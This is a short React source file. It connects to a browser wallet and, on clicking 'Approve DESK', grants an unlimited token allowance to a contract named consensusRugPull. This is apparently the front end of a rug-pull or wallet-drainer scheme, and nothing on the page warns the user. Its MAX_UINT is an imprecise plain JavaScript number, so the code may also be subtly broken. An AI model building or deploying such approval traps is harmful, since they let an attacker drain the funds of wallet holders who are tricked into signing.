import './App.css';
import { useState } from 'react';
import { ethers } from 'ethers'
import deskTokenABI from './constants/abi/deskToken.json';
import { deskToken, consensusRugPull } from './config';

const MAX_UINT = 2 ** 256 - 1;

function App() {
  async function requestAccount() {
    await window.ethereum.request({ method: 'eth_requestAccounts' });
  }

  async function approve() {
    if (typeof window.ethereum !== 'undefined') {
      await requestAccount()
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      console.log({ provider })
      const signer = provider.getSigner()
      const deskTokenContract = new ethers.Contract(deskToken, deskTokenABI, signer)
      const transaction = await deskTokenContract.approve(consensusRugPull, MAX_UINT);
      await transaction.wait();
    } 
  }

  return (
    <div className="App">
      <header className="App-header">
        <input placeholder="Set greeting" />
        <button onClick={approve} placeholder="Amount to approve">Approve DESK</button>
        <br />
      </header>
    </div>
  );
}

export default App;
